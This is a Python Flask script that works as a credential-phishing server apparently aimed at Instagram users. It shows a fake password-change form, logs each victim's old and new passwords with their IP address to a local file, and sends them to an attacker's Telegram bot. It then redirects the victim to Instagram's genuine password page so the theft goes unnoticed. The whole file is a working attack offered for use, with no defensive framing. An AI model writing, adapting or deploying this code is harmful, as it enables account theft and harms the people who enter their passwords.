from flask import Flask, request, render_template, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'
TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'

def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    headers = {'User-Agent': 'Mozilla/5.0'}
    response = requests.post(url, data=data, headers=headers)
    return response

def save_message_to_file(message):
    ip = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('login_info.txt', 'a') as file:
        file.write(f"[{now}] IP: {ip}\n{message}\n{'-'*30}\n")

@app.route('/')
def index():
    return render_template('change_password.html')

@app.route('/change_password', methods=['POST'])
def handle_change_password():
    old_password = request.form.get('oldPassword')
    new_password = request.form.get('newPassword')
    confirm_password = request.form.get('confirmPassword')

    if not old_password or not new_password or not confirm_password:
        return "Missing fields", 400

    if new_password != confirm_password:
        return "New passwords do not match", 400

    message = f'Old Password: {old_password}\nNew Password: {new_password}'
    
    save_message_to_file(message)
    send_message_to_telegram(message)

    return redirect('https://www.instagram.com/accounts/password/change/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)